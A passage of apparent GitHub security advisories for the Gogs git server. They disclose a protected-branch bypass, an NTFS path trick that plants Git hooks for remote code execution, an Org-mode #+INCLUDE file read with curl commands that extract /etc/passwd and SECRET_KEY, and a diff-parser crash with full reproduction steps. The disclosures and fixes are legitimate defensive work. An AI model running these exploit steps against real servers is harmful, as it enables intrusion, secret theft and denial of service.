os.Getenv('SSH_ORIGINAL_COMMAND') == '' { return nil // Exits immediately, skipping ALL checks } // ... branch protection enforcement follows ``` When `SSH_ORIGINAL_COMMAND` is empty (as it is during PR merge), the hook returns nil without checking protected branches, whitelists, or any other restriction. The properly protected code paths (HTTP push via `serviceRPC` and web editor via `UpdateRepoFile`) both call `ComposeHookEnvs` at `internal/database/repo_editor.go:64-77`, which sets `SSH_ORIGINAL_COMMAND=1` along with user and repo identification. This environment reaches the hook through the git process, enabling protection enforcement. The PR merge path was missed entirely. ### PoC Tested on Gogs 0.14.3 (latest stable release), Linux. **Setup:** Repository `testadmin/test-repo` with branch `main` protected (whitelist enabled, only user ID 1 `testadmin` whitelisted). User `regularuser` (ID:2) has Write access but is NOT in the whitelist. **Step 1: Confirm HTTP push to protected branch is correctly blocked** ```bash # Clone as regularuser using access token git clone http://regularuser:<token>@TARGET:3000/testadmin/test-repo.git cd test-repo echo 'test' > bypass.txt && git add bypass.txt git commit -m 'Direct push attempt' git push origin main ``` Output: ``` remote: Gogs: Branch 'main' is protected and you are not in the push whitelist ! [remote rejected] main -> main (pre-receive hook declined) ``` HTTP push correctly enforces branch protection. **Step 2: Simulate what pr.Merge() does internally (local git push without env vars)** ```bash # Clone the bare repo locally (simulating pr.Merge temp workspace) BASE_REPO='/data/repos/testadmin/test-repo.git' git clone '$BASE_REPO' /tmp/merge-workspace cd /tmp/merge-workspace # Create merge commit as non-whitelisted user echo 'bypass' > merged-via-pr.txt && git add merged-via-pr.txt git commit -m 'Merge pull request - bypasses protection' \ --author='regularuser <regular@test.local>' # Push directly to base repo WITHOUT SSH_ORIGINAL_COMMAND # This is exactly what git.Push(tmpBasePath, baseGitRepo.Path(), pr.BaseBranch) does unset SSH_ORIGINAL_COMMAND git push '$BASE_REPO' main ``` Output: ``` To /data/repos/testadmin/test-repo.git 0747518..2205841 main -> main ``` Push succeeds. The pre-receive hook exited at line 64 because `SSH_ORIGINAL_COMMAND` was empty, skipping all protection checks. **Step 3: Confirm the same push IS blocked when SSH_ORIGINAL_COMMAND is set** ```bash SSH_ORIGINAL_COMMAND=1 GOGS_AUTH_USER_ID=2 GOGS_REPO_ID=1 \ git push '$BASE_REPO' main ``` Output: ``` remote: Gogs: Branch 'main' is protected and you are not in the push whitelist ! [remote rejected] main -> main (pre-receive hook declined) ``` This proves the pre-receive hook works correctly when the environment variable is present. The only issue is that `pr.Merge()` never provides it. **Full attack path:** A repository collaborator with Write permission but not in the protected branch whitelist creates a branch, opens a pull request targeting the protected branch, and clicks 'Merge'. The merge handler has no application-level protection check, and the git push it performs triggers the pre-receive hook without `SSH_ORIGINAL_COMMAND`, causing the hook to exit immediately and allow the merge. ### Impact Protected branches are a core security feature that organizations rely on to enforce code review, restrict who can write to production branches, and prevent unauthorized changes. This vulnerability completely negates that protection for the PR merge code path. A collaborator with Write access can merge any pull request into any protected branch, even when: - They are explicitly excluded from the push whitelist - The branch requires pull request approval (the merge is done by the submitter, with no separate approval check) - The branch has any form of merge restriction enabled This allows bypassing mandatory code review workflows, merging malicious or untested code into release branches, and undermining the integrity of the software supply chain for any project hosted on the Gogs instance. The attacker only needs basic Write collaborator access, which is commonly granted to external contributors or junior developers who are intentionally excluded from direct-push privileges on critical branches. The root cause is that `pr.Merge()` uses `git.Push()` from git-module v1.8.8, which has no mechanism to pass environment variables. The `ComposeHookEnvs` function that other code paths use to enable hook enforcement cannot be applied here. Fixing this requires either adding environment variable support to git-module's `Push` function, or adding an application-level protected branch check in the `MergePullRequest` handler before calling `pr.Merge()`.

GHSA-hc35-pcqw-5xjq.title: NTFS $INDEX_ALLOCATION bypass allows authenticated RCE via Git hooks
GHSA-hc35-pcqw-5xjq.description: ### **Summary** The fix in PR #8408 does not fully prevent writes into a repository's `.git` directory on Windows. `isRepositoryGitPath` handles trailing dots and spaces, but does not account for NTFS Alternate Data Streams. On NTFS, the path: `.git::$INDEX_ALLOCATION/hooks/pre-commit` resolves to the real: `.git/hooks/pre-commit` The guard returns `false` for this path, allowing an authenticated user with repository write access to create a Git hook through the web editor. Gogs then runs `git commit` without `--no-verify`, causing the planted hook to execute as the Gogs service account. This results in authenticated remote code execution on Windows hosts. The issue also existed before PR #8408. The new fix blocks trailing dot and space variants, but does not cover the NTFS ADS equivalent path. ### **Details** The current guard in `internal/database/repo_editor.go` is: ```go func isRepositoryGitPath(path string) bool { path = strings.ToLower(path) for _, component := range strings.FieldsFunc(path, func(r rune) bool { return r == '/' || r == '\\' }) { if strings.TrimRight(component, '. ') == '.git' { return true } } return false } ``` For: ```text .git::$INDEX_ALLOCATION/hooks/pre-commit ``` the first component remains: ```text .git::$index_allocation ``` after `strings.TrimRight(component, '. ')`. It therefore does not match `.git`, and the guard allows the path. On NTFS, `.git::$INDEX_ALLOCATION` resolves to the actual `.git` directory through its `$INDEX_ALLOCATION` attribute. The path reaches the write through: ```text web editor pathx.Clean UpdateRepoFile isRepositoryGitPath path.Join os.MkdirAll os.WriteFile git.Add git.CreateCommit ``` None of the path processing before `os.WriteFile` rejects or removes `:`. The crafted path therefore reaches the real `.git/hooks/pre-commit` file. `git.CreateCommit` then runs `git commit` without `--no-verify`, causing the planted hook to execute. ### **PoC** I attached `gogs-ads-bypass.py`, which reproduces the issue using Python 3 and the standard library only. Testing was performed on Windows 11 with NTFS, Python 3.13.5, Git 2.45.1, and a Gogs instance built from current `main` at commit `aec2b842`. The PoC first confirms that the guard accepts: ```text .git::$INDEX_ALLOCATION/hooks/pre-commit ``` Result: ```text caught by #8408 guard : False ``` It then writes through the same path and confirms that the real file was modified: ```text .git\hooks\pre-commit ``` Result: ```text write : SUCCEEDED RESULT: CONFIRMED ``` The planted hook is then executed by the server side Git commit: ```text hook present at .git/hooks/pre-commit: True hook_fired=True RESULT: CONFIRMED ``` I also tested the issue end to end against a live Gogs instance. The following value was submitted through the web editor: ```text tree_path = .git::$INDEX_ALLOCATION/hooks/pre-commit ``` The request succeeded, the hook was written into the repository's real `.git/hooks` directory, and it executed as the operating system account running Gogs. The hook remained in place and executed again during a later normal commit. I also confirmed the `GIT~1/hooks/pre-commit` NTFS 8.3 variant in a separate repository. ### **Impact** An authenticated user with write access to any repository can execute arbitrary commands as the Gogs service account on a Windows NTFS host. This can allow access to other repositories and Gogs data available to that account, modification of server side files, compromise of build pipelines, and potentially further compromise of the host or connected infrastructure. No victim interaction is required. The attacker can plant and trigger the hook through their own web editor request. The web editor is enabled for non mirror repositories, so any repository writer on an affected Windows deployment can reach the vulnerable path. The issue reproduces on current `main`, including commit `aec2b842`, and affects released versions through `0.14.3`. ### **Attachments** [liveservertranscript.txt](https://github.com/user-attachments/files/31487875/liveservertranscript.txt) [gogs_adsbypass.py](https://github.com/user-attachments/files/31487878/gogs_adsbypass.py)

GHSA-hr26-3fq5-9365.title: Unauthenticated Arbitrary Server File Read via go-org `#+INCLUDE`/`#+SETUPFILE` in Org-mode markup rendering
GHSA-hr26-3fq5-9365.description:
# Gogs 0.14.x — Unauthenticated Arbitrary Server File Read via go-org `#+INCLUDE`/`#+SETUPFILE` in Org-mode markup rendering | | | |---|---| | **Affected** | Gogs 0.14.x (and `main`, unpatched at audit time) | | **Tested commit** | `d460e50fc82978640cfaa202ce5fbbb6fe0f7dc7` (2026-08-06) | | **Component** | `internal/markup/orgmode.go` → `github.com/niklasfasching/go-org v1.9.1` (`org/document.go`, `org/keyword.go`, `org/html_writer.go`) | | **CWE** | CWE-73: External Control of File Name or Path (arbitrary file read) | | **Severity** | **CRITICAL** (unauthenticated disclosure of server secrets; SECRET_KEY theft → token forgery) | | **CVSS 3.1** | 9.1 (AV:N/AC:L/PR:N/UI:N/S:C/C:H/I:N/A:N) — the read step is unauthenticated; a write-capable repo authoring step is assumed per the chain below | | **Related** | Gitea **CVE-2026-59774** — same bug class (unrestricted go-org `#+INCLUDE` file read through the blob/markup render path), patched in Gitea 1.27.1 | --- ## 1. Summary Gogs renders Org-mode (`.org`) repository files through the third-party parser `github.com/niklasfasching/go-org v1.9.1`. That library implements the Org-mode keywords `#+INCLUDE` and `#+SETUPFILE` as an **unrestricted local file read** whose default `ReadFile` is plain `ioutil.ReadFile`, with no allowlist, sandbox, or path guard. When a user views a crafted `.org` file (via the public `/src/*` blob view), the Gogs server process reads an **arbitrary absolute path from the filesystem** and emits its raw contents unescaped into the rendered HTML response. The most damaging target is the Gogs configuration file, `/custom/conf/app.ini`, which contains `SECRET_KEY`, the database connection credentials, and `[server]` secrets. Disclosure of `SECRET_KEY` is a known token/session-forging primitive in Gogs. Any account able to author a `.org` file in any repository (own repo, or any repo with write access) can read arbitrary files; the *viewing/reading* step itself is anonymous for public repositories (`REQUIRE_SIGNIN_VIEW = false` by default). This is **reproduced live** (a real go-org v1.9.1 dependency, Gogs' own render pipeline), not just a source-code trace. **Disclosure status.** The underlying bug class is already public: Gitea's **CVE-2026-59774** (identical Org-mode `#+INCLUDE` arbitrary file read through go-org) was fixed in Gitea 1.27.1, fix PRs `go-gitea/gitea#38642` / `#38645` (merged 2026-07-26), credited to @xbow-security and @NightRang3r. Gitea and Gogs are separate projects; Gogs uses the same go-org v1.9.1 with the same unsafe default and its `internal/markup/orgmode.go` remains unpatched (byte-identical to the audited commit `d460e50`). This report is therefore a reproduction that a publicly-known bug class remains exploitable in Gogs, not a first-time disclosure of the class. Because the class is public there is no coordinated-disclosure embargo to respect, but Gogs is still unpatched, so report privately first (§9). ## 2. Root cause `go-org` ships an unsafe default for reading included files: - `org/document.go:96` — the `New()` configuration sets `ReadFile: ioutil.ReadFile`. The package doc comments (document.go:31): 'ReadFile is used to read e.g. #+INCLUDE files.' There is no allowlist, no sandbox, and no path restriction anywhere in the package. - `org/keyword.go:147-167` — `parseInclude`: - Regex (keyword.go:40): `(?i)^'([^']+)' (src|example|export) (\w+)$` - `if !filepath.IsAbs(path) { path = filepath.Join(filepath.Dir(d.Path), path) }` — **absolute paths pass through untouched**; there is no `..`, symlink, or absolute-path guard. - `bs, err := d.ReadFile(path)` — the raw file read, executed at render time (the `resolve` closure). - `org/keyword.go:169-188` — `loadSetupFile` performs the same unrestricted `ReadFile` for `#+SETUPFILE:` (blind read: it only merges buffer settings, it does not echo content; `#+INCLUDE` is the disclosure vector). - `org/html_writer.go:222-224` — `WriteInclude` calls `i.Resolve()`, i.e., the page render *performs the read*. - `org/block.go:69` + `org/html_writer.go:627-639` — `isRawTextBlock('SRC'/'EXAMPLE'/'EXPORT')` → `blockContent` sets `htmlEscape = false`, and `WriteText` (html_writer.go:326-334) writes `t.Content` **verbatim, unescaped**. - `org/html_writer.go:160-175` — for `EXPORT` with parameter `html`, `w.WriteString(content + ' ')` emits the raw bytes with **no escaping at all**. Gogs passes untrusted blob bytes straight into this parser: - `internal/markup/orgmode.go:25-31` — `RawOrgMode`: `org.New().Silent().Parse(bytes.NewReader(body), urlPrefix).Write(org.NewHTMLWriter())`. No content or path filtering. - `internal/markup/orgmode.go:34-36` — `OrgMode` → `Render(TypeOrgMode, ...)`. - `internal/markup/markup.go:330-341` — `Detect` selects the renderer by **file extension only**; `.org` → `TypeOrgMode`. An attacker controls the extension by committing a file named `*.org`. - `internal/markup/markup.go:343-368` — `Render` produces `rawHTML`, then `postProcessHTML` + `SanitizeBytes`. The sanitizer (bluemonday UGCPolicy) strips disallowed **tags** but does **not escape plain text**; a line like `SECRET_KEY = abc123` has no tags and passes through verbatim. - `templates/repo/view_file.tmpl:41` — `{{.FileContent | Str2HTML}}`. - `internal/template/template.go:141-143` — `Str2HTML` = `template.HTML(markup.Sanitize(raw))`, which also bypasses Go template auto-escaping. Result: the included file's raw text lands in the served page. ## 3. Attack chain (verified end to end) 1. **Author.** The attacker needs write access to some repository. On the default shipped config self-registration is disabled (`conf/app.ini:219 DISABLE_REGISTRATION = true`), so the realistic preconditions are: (a) deployments with self-registration enabled, or (b) any account created by an admin, or (c) any repo the attacker can collaborate on or fork-push to. One account is enough to host the payload in a public repo. 2. **Craft.** Commit a file `poc.org` containing an INCLUDE directive pointing at an absolute path (see §5). 3. **Render.** The server renders the blob on view: - `cmd/gogs/internal/web/web.go:518-522` — `GET /:owner/:repo/src/*` → `repo.Home`, guarded by `ignSignIn, context.RepoAssignment()` (web.go:530). - `conf/app.ini:217` — `REQUIRE_SIGNIN_VIEW = false` (default): public repos are viewable **anonymously**. - `internal/route/repo/view.go:118-158` — `renderFile` → `markup.Detect(blob.Name())` → `case markup.TypeOrgMode:` → `markup.OrgMode(p, path.Dir(treeLink), ...)`. - The `.org` file itself is tiny, so the `blob.Size() >= conf.UI.MaxDisplayFileSize` guard (view.go:145) does not block; the **INCLUDE target size is never checked**. 4. **Disclose.** go-org reads the target file and emits it raw into HTML; bluemonday + `template.HTML` keep the plain text intact; the response body contains the file contents. ## 4. Impact - **Anonymous arbitrary server file read** on any public repository: - `/custom/conf/app.ini` — `SECRET_KEY` (token/session forging primitive), DB credentials, `[server]` secrets. Config path resolution: `internal/conf/computed.go:62,76-87` (CustomDir = `GOGS_CUSTOM` or `WorkDir()/custom`), `internal/conf/conf.go:68` (`customConf = filepath.Join(CustomDir(), 'conf', 'app.ini')`), `internal/conf/conf.go:203-205` (SECRET_KEY is enforced at startup). - `/etc/passwd`, `.git/config`, env files, TLS keys, any path the `gogs` process can read (which is the service account, typically a git user). - **SECRET_KEY theft** enables known token/session forgery paths in this codebase. - Same bug class as Gitea CVE-2026-59774 (unauthenticated arbitrary file read via Org-mode INCLUDE, Gitea 1.22.1–1.27.0, patched in 1.27.1). Gogs `main` is byte-identical to the audited version (unpatched). ## 5. Proof of Concept ### 5.1 Minimal functional PoC (Gogs render pipeline, Go test — as executed during the audit) Run inside the Gogs module (real `go-org v1.9.1` from `go.mod:37`). This is the exact live-probe used to confirm the finding: ```go // go test -run=TestOrgIncludeProbe ./probe/ package probe import ( 'os' 'testing' 'gogs.io/gogs/internal/markup' ) func TestOrgIncludeProbe(t *testing.T) { // 1. Create a 'secret' file the server should never expose. if err := os.WriteFile('/tmp/orgprobe_secret.txt', []byte('TOPSECRET-12345 '), 0o600); err != nil { t.Fatal(err) } // 2. Render a malicious .org blob through Gogs' own pipeline. body := []byte('#+INCLUDE: '/tmp/orgprobe_secret.txt' src bash ') out := string(markup.RawOrgMode(body, '/someuser/somerepo')) // 3. The secret is present, unescaped, in the HTML. if !strings.Contains(out, 'TOPSECRET-12345') { t.Fatalf('secret not leaked: %s', out) } t.Logf('LEAKED: %s', out) } ``` Observed output (audit run): ``` 
 TOPSECRET-12345
``` The **full `Render` + `SanitizeBytes` path** used by the file view also leaks: ```go leaked := markup.OrgMode(body, '/someuser/somerepo', nil) // 
 // TOPSECRET-12345 //
← still present after sanitization ``` ### 5.2 End-to-end exploit (manual) Preconditions: a repository the attacker can write to, and a public instance (`REQUIRE_SIGNIN_VIEW = false`, default). **Step 1 — commit the payload.** Create `poc.org` in the repository: ```org #+INCLUDE: '/etc/passwd' export html ``` For the config (adjust the absolute path to the deployment's WorkDir): ```org #+INCLUDE: '/home/git/gogs/custom/conf/app.ini' export html ``` > **Notes on path control.** Absolute paths pass through go-org untouched > (keyword.go:154-156). The reliable vector is a full absolute path. Relative > paths are joined onto `filepath.Dir(d.Path)`, where `d.Path` is the render URL > prefix (e.g. `/owner/repo/src/main`), so relative traversal resolves against > that URL-derived path, not the repo; absolute is deterministic. **Step 2 — trigger the render anonymously.** Any visitor (no login) requests the blob view: ```bash curl -s 'http://TARGET/user/repo/src/main/poc.org' | grep -E '^(root|daemon|git):' ``` Observed on the live probe with `/etc/passwd`: ``` root:x:0:0:root:/root:/bin/bash daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin git:x:1000:1000:...:/home/git:/bin/bash ... (full file) ``` **Step 3 — exfiltrate SECRET_KEY:** ```bash curl -s 'http://TARGET/user/repo/src/main/poc.org' | grep -E 'SECRET_KEY|PASSWD|HOST' ``` `SECRET_KEY` lines carry no HTML tags, so they pass through bluemonday verbatim. ### 5.3 ASan / UBSan **Not applicable.** This is a Go logic/authorization flaw (unrestricted file path read), not a memory-safety bug. There is no out-of-bounds access, no use-after-free, and no undefined behavior; ASan/UBSan add nothing to detection or repro. The finding reproduces functionally: the target file's bytes appear in the HTTP response. (Go memory safety is enforced by the runtime; Gogs does not use cgo in this path.) ## 6. Fix The root cause is the library default, so fix at the Gogs layer. **Gitea's own patch is the reference**: Gitea 1.27.1 (`modules/markup/orgmode/orgmode.go`, PR `#38642`) replaces the default `ReadFile` on the `org.Configuration` so an INCLUDE never reads the filesystem, it is rendered as inert plain text: ```go cfg := org.New() cfg.ReadFile = func(path string) ([]byte, error) { // orgmode render does not support nested content rendering, // so just leave the plain text to end users return []byte(fmt.Sprintf('#+INCLUDE: [[%s]]', path)), nil } doc := cfg.Silent().Parse(input, '') res, err := doc.Write(w) ``` Applying the same change to `internal/markup/orgmode.go:25-31` (`RawOrgMode`) fixes the disclosure vector in Gogs while preserving INCLUDE's plain-text display. Note the same `Configuration`-level override also neutralizes `#+SETUPFILE` (it calls the same `ReadFile`, keyword.go:174), so no separate filter is needed. Alternative and equivalent fix: strip/reject `#+INCLUDE` and `#+SETUPFILE` lines from `.org` input **before** `Parse`. Regression: add a `.org` test asserting an INCLUDE directive is rendered as inert text and its target content never appears in the output. ## 7. Verified evidence summary | Chain link | Evidence | |---|---| | Unsafe default read | `go-org@v1.9.1/org/document.go:96` `ReadFile: ioutil.ReadFile`; no guard anywhere in package | | INCLUDE matches & reads | `org/keyword.go:147-167`; absolute path untouched (154-156); `d.ReadFile(path)` (158) | | SETUPFILE same read | `org/keyword.go:169-188` (blind read) | | Raw, unescaped emission | `org/block.go:69`; `org/html_writer.go:627-639` (`htmlEscape=false`); `html_writer.go:160-175` (EXPORT html raw); `html_writer.go:326-334` (WriteText verbatim) | | Gogs passes untrusted blob | `internal/markup/orgmode.go:25-31`, `orgmode.go:34-36`, `markup.go:360-367` | | Renderer chosen by extension only | `markup.go:330-341`, `orgmode.go:11` | | Public anonymous reachability | `cmd/gogs/internal/web/web.go:518-522,530` (`ignSignIn`); `conf/app.ini:217` `REQUIRE_SIGNIN_VIEW=false`; `internal/database/permissions.go:80-83` (public repos → read) | | Sanitizer keeps plain text | `internal/markup/sanitizer.go:21-23` (bluemonday UGCPolicy, no text escaping); `templates/repo/view_file.tmpl:41`; `internal/template/template.go:141-143` (`template.HTML`) | | Config file location | `internal/conf/computed.go:62,76-87`; `internal/conf/conf.go:68`; `conf/app.ini:163` `SECRET_KEY` | | Library version pinned | `go.mod:37` `github.com/niklasfasching/go-org v1.9.1`; `go.sum:332-333` | ## 8. Reproduction status - [x] Source-level chain verified line by line - [x] Live reproduction through Gogs' real `RawOrgMode`/`OrgMode` pipeline with `go-org v1.9.1` (secret file + `/etc/passwd` both rendered into HTML, content intact after `SanitizeBytes`) - [x] Cross-model adversarial skeptic (5 attack angles) failed to break the chain; **CONFIRMED CRITICAL** - [x] Same bug class publicly known and fixed upstream in Gitea (CVE-2026-59774, Gitea 1.27.1, PR #38642/#38645) ## 9. Disclosure notes - Gitea's CVE-2026-59774 is published and its fix (PR #38642) shows the exact remediation; no embargo applies to the bug class. - Gogs remains **unpatched** (its `internal/markup/orgmode.go` is byte-identical to the audited commit). Treat this as a live 0-day in Gogs until Gogs ships a fix. - Report to Gogs privately first per Gogs `SECURITY.md`: only GitHub Security Advisories (https://github.com/gogs/gogs/security/advisories/new) is accepted for new reports; must be English and reproducible on latest `main` (it is). Optionally reference the Gitea PR as the known-good patch. - Do not publish this file or a PoC before Gogs has had time to respond; the public bug class lowers the disclosure risk, but Gogs' unpatched status still warrants private coordinated disclosure.

GHSA-p27c-f9fr-4jmw.title: Remote process crash in Gogs diff rendering via a quoted rename path
GHSA-p27c-f9fr-4jmw.description: ## Summary Gogs builds compare and pull request diffs by running `git diff` and passing the output to the diff parser in `github.com/gogs/git-module` v1.8.9. For a rename where the old path is unquoted and the new path is C-quoted, Git produces a header such as: ```text diff --git a/old.txt 'b/new\tname.txt' ``` The parser assumes an unquoted header contains the byte sequence ` b/`. This header contains ` 'b/` instead. `strings.Index` returns -1 and the next slice operation panics with `slice bounds out of range [:-1]`. `Repository.Diff` runs the parser in a goroutine started with `go StreamParseDiff` and does not recover the panic. The panic therefore terminates the entire Gogs process. The HTTP server's handler recovery does not cover this child goroutine. A user who can create a repository, push a commit, or fork a public repository and open a compare or pull request page can produce the commit and load the page. A public repository compare page can also be viewed without signing in. In an isolated Docker lab, the request returned no HTTP response and the container exited with status 2. The crash is repeatable. No confidentiality or integrity impact was demonstrated. ## Root Cause The panic is in `parseFileHeader` in `github.com/gogs/git-module` v1.8.9, `diff.go:255-282`: ```go var diffHead = []byte('diff --git ') func (p *diffParser) parseFileHeader() (*DiffFile, error) { line := string(p.buffer) p.buffer = nil var middle int hasQuote := line[len(diffHead)] == ''' if hasQuote { middle = strings.Index(line, ` 'b/`) } else { middle = strings.Index(line, ` b/`) } beg := len(diffHead) a := line[beg+2 : middle] b := line[middle+3:] ``` Git quotes each path when it contains a tab, double quote, backslash, or newline. In a rename, the two sides can differ in whether they need quoting. With `a/old.txt` and `'b/new\tname.txt'`, `hasQuote` is false because the first path starts with `a`, and the search for ` b/` does not match the header because the separator is followed by a quote. `middle` is -1 and the slice `line[beg+2:middle]` panics. The same failure occurs in the reverse case, where the first path is quoted and the second is not. The parser does not check the result of `strings.Index`. It also indexes `line[len(diffHead)]` without checking that the line is longer than the header prefix. Gogs reaches this code through these paths: - `internal/gitx/diff.go:185-191` `RepoDiff` calls `repo.Diff`. - `github.com/gogs/git-module` `repo_diff.go:31-70` runs `git diff --full-index -M <base> --end-of-options <head>` and starts `go StreamParseDiff` at line 66. The goroutine has no recovery. The request handler blocks at `repo_diff.go:75` waiting on the result channel while the child goroutine panics. - `internal/route/repo/commit.go:141-161` `CompareDiff` calls `RepoDiff` for the `/compare/:before...:after` page. - `internal/route/repo/pull.go:339-362` `ViewPullFiles` calls `RepoDiff` on the head repository for `/pulls/:index/files`. - `internal/route/repo/pull.go:560-595` `PrepareCompareDiff` calls `RepoDiff` while rendering the compare and pull request page. - The routes are registered at `cmd/gogs/internal/web/web.go:452-453`, `:514`, and `:529`. The compare and pull request routes use `ignSignIn` and `RepoAssignment`, so public repositories can be read without signing in. Gogs sets `core.quotepath=false` globally at startup (`internal/database/repo.go:158-162`). That stops Git from quoting ordinary non-ASCII paths, but it does not affect control characters, double quotes, or backslashes. The tab in the reproduced header is still quoted under the running server, as the lab log shows. There is no length check, no separator check, and no panic recovery around the parsing goroutine. `macaron.Recovery()` at `cmd/gogs/internal/web/web.go:759` wraps the handler chain, so it cannot recover a panic on the parser goroutine. The same parser is used by the editor diff preview through `internal/gitx/diff.go:173-182`, which also starts a goroutine without recovery. ## Prerequisites - A Gogs account that can create a repository, push a commit, or fork a public repository and open a compare or pull request page. Repository creation and forking are enabled by default. Self-registration may be disabled, in which case an existing account is needed. - A repository the attacker can write to, or a public base repository that accepts pull requests and a fork owned by the attacker. - A commit that renames a file to a name containing a tab, double quote, backslash, or newline. Creating this commit requires write access to some repository or a fork. - No victim interaction. The attacker loads the compare or pull request page and the server crashes while building the response. - The crash request itself can be unauthenticated. Once a public repository contains the rename commit, any visitor can request the compare page without signing in. - No special configuration. The behavior occurs with the default Git settings used by Gogs. ## Steps to Reproduce All steps below were run in Docker on an isolated `--network none` network with a disposable data directory. The image was built from the target commit. 1. Build the image from the source at commit `43017045492c85e201536bfc7af49fa9f74b0069`: ```sh docker build -f Dockerfile.next -t gogs-lab:4301704 . ``` 2. Create `/data/gogs/conf/app.ini` with a working SQLite configuration: ```ini RUN_USER = git RUN_MODE = prod [server] EXTERNAL_URL = http://localhost:3000/ DISABLE_SSH = true APP_DATA_PATH = /data/gogs/data [repository] ROOT = /data/git/gogs-repositories [database] TYPE = sqlite3 PATH = /data/gogs/data/gogs.db [security] SECRET_KEY = lab-only-secret-key ``` 3. Start the server once to create the database schema, then stop it: ```sh docker run -d --name gogs-lab --network none -v <data-dir>:/data gogs-lab:4301704 # wait for 'Available on http://localhost:3000/', then docker stop gogs-lab ``` 4. Create an administrator. The admin CLI does not create the legacy schema on an empty database, so it must run after step 3: ```sh docker run --rm --network none -v <data-dir>:/data gogs-lab:4301704 \ gogs admin create-user --admin --name alice --password '<admin-password>' --email alice@example.com ``` 5. Start the server again and create a token and a public non-bare repository: ```sh docker run -d --name gogs-lab --network none -v <data-dir>:/data gogs-lab:4301704 docker exec gogs-lab curl -s -u alice:'<admin-password>' \ -X POST http://localhost:3000/api/v1/users/alice/tokens \ -H 'Content-Type: application/json' -d '{'name':'lab'}' docker exec gogs-lab curl -s \ -H 'Authorization: token <token>' -H 'Content-Type: application/json' \ -X POST http://localhost:3000/api/v1/user/repos \ -d '{'name':'demo','auto_init':true,'readme':'Default','private':false}' ``` 6. Clone the repository and push a rename to a quoted name. The tab is written with `printf`: ```sh git clone http://alice:'<admin-password>'@localhost:3000/alice/demo.git cd demo git config user.email a@b.c git config user.name a printf 'x\n' > old.txt git add old.txt git commit -m add parent=$(git rev-parse HEAD) new='new$(printf '\t')name.txt' git mv old.txt '$new' git commit -m rename head=$(git rev-parse HEAD) git push origin master ``` 7. Request the compare view between the two commits. The repository is public, so no credentials are sent: ```sh curl -s -m 10 -o /dev/null -w 'http=%{http_code}\n' \ 'http://localhost:3000/alice/demo/compare/$parent...$head' ``` The client receives no response (`http=000`). The Gogs process exits with status 2. The log shows the panic from `parseFileHeader`. The same commit can be placed in a fork and viewed through `/pulls/<index>/files` or the compare-and-pull-request page, which also call `RepoDiff` on the head repository. ## Evidence - `gogs-panic-clean.log`: the Gogs process log showing the panic, the `parseFileHeader` frame, the `StreamParseDiff` goroutine, and the `Repository.Diff` goroutine. The process terminates after the panic. ```bash 2026/11/11 09:16:59 [ INFO] Gogs 0.15.0+dev 2026/11/11 09:16:59 [ INFO] Run mode: Production 2026/11/11 09:17:00 [ INFO] Git config user.name set to Gogs 2026/11/11 09:17:00 [ INFO] Git config user.email set to gogs@fake.local 2026/11/11 09:17:00 [ INFO] Available on http://localhost:3000/ 2026/11/11 09:17:24 [ INFO] Gogs 0.15.0+dev 2026/11/11 09:17:24 [ INFO] Run mode: Production 2026/11/11 09:17:25 [ INFO] Available on http://localhost:3000/ docker : + mkdir -p /data/gogs /data/git At line:1 char:404 + ... e Directory -Force $dir | Out-Null; docker logs gogs-dos 2>&1 | Out-F ... + ~~~~~~~~~~~~~~~~~~~~~~~~~ + CategoryInfo : NotSpecified: (+ mkdir -p /data/gogs /data/git:String) [], RemoteException + FullyQualifiedErrorId : NativeCommandError + exec /app/gogs/gogs web + mkdir -p /data/gogs /data/git + exec /app/gogs/gogs web panic: runtime error: slice bounds out of range [:-1] goroutine 127 [running]: github.com/gogs/git-module.(*diffParser).parseFileHeader(0x1cf7804b700) github.com/gogs/git-module@v1.8.9/diff.go:278 +0x95e github.com/gogs/git-module.(*diffParser).parse(0x1cf7804b700) github.com/gogs/git-module@v1.8.9/diff.go:489 +0x3c5 github.com/gogs/git-module.StreamParseDiff({0x66020a8, 0x1cf79709ce0?}, 0x1cf78891ea0, 0x64, 0x3e8, 0x7d0) github.com/gogs/git-module@v1.8.9/diff.go:553 +0x1d9 created by github.com/gogs/git-module.(*Repository).Diff in goroutine 182 github.com/gogs/git-module@v1.8.9/repo_diff.go:66 +0xb6f ``` - `trigger-transcript.txt`: the parent and rename commit IDs, the compare request, the empty HTTP response, the container exit status, and the panic stack. ```bash Isolated Docker reproduction, Gogs main @ 43017045492c85e201536bfc7af49fa9f74b0069 Setup (summary): - Image built from the source with Dockerfile.next as gogs-lab:4301704. - Container run with --network none and a disposable /data directory. - SQLite database, SSH disabled, self-registration disabled. - Admin user created with `gogs admin create-user` after the first server start created the schema. - Public repository 'alice/demo' created with auto_init=true and readme=Default. - A commit added old.txt, then renamed it to a name containing a tab, and both commits were pushed. Commits: parent=a5c725f316b2ae895d2e18af4b1fc2b109b1660a head=a6ab439d48376ad1694dc716d221f25e86dc1d1e Request: GET http://localhost:3000/alice/demo/compare/a5c725f316b2ae895d2e18af4b1fc2b109b1660a...a6ab439d48376ad1694dc716d221f25e86dc1d1e Observed: http=000 (no HTTP response; connection dropped) Container status immediately after the request: gogs-dos Exited (2) 2 seconds ago Server log: panic: runtime error: slice bounds out of range [:-1] goroutine 127 [running]: github.com/gogs/git-module.(*diffParser).parseFileHeader(0x1cf7804b700) github.com/gogs/git-module@v1.8.9/diff.go:278 +0x95e github.com/gogs/git-module.(*diffParser).parse(0x1cf7804b700) github.com/gogs/git-module@v1.8.9/diff.go:489 +0x3c5 github.com/gogs/git-module.StreamParseDiff({0x66020a8, 0x1cf79709ce0?}, 0x1cf78891ea0, 0x64, 0x3e8, 0x7d0) github.com/gogs/git-module@v1.8.9/diff.go:553 +0x1d9 created by github.com/gogs/git-module.(*Repository).Diff in goroutine 182 github.com/gogs/git-module@v1.8.9/repo_diff.go:66 +0xb6f ``` ## Impact Availability is the only demonstrated impact. A single HTTP request terminates the whole Gogs process on a default configuration. Every repository, user session, SSH connection, and background task on that instance is interrupted until the service is restarted. The attacker can repeat the request after a restart, so the outage can be sustained. A low-privileged user can stop the service for all users, including administrators. An attacker who submits the rename commit through a fork and pull request can affect a public project without write access to the base repository. A public compare page can also be opened without signing in, so the crash does not require the attacker to hold a session on the target instance. No confidentiality or integrity impact was demonstrated. The crash does not expose data or modify repository content. ## Expected Result The diff parser should accept both quoted and unquoted `diff --git` headers, locate the separator between the two paths whether or not either path is quoted, and return an error for any header it cannot parse. A malformed or unexpected diff should produce an error response, not a panic. Even if the parser encounters an unexpected input, the goroutine that parses the diff should recover the panic and send an error to the caller. A parsing failure must not terminate the process. ## Suggested Fix In 